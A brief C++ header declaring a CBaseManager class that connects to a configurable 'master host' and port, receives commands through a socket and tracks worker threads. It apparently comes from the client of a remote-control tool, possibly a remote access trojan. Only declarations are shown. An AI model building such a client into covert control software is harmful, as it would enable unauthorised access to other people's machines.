#pragma once
#include "Manager.h"

class CBaseManager:public CManager
{
public:
	CBaseManager(CClientSocket *pClient, LPCSTR lpszMasterHost, UINT nMasterPort);
	CBaseManager(CClientSocket *pClient);
	virtual ~CBaseManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	bool IsActived();

	static	char	m_strMasterHost[256];
	static	UINT	m_nMasterPort;

private:
	HANDLE	m_hThread[1000]; // ◊„πª”√¡À
	UINT	m_nThreadCount;
	bool	m_bIsActived;
};

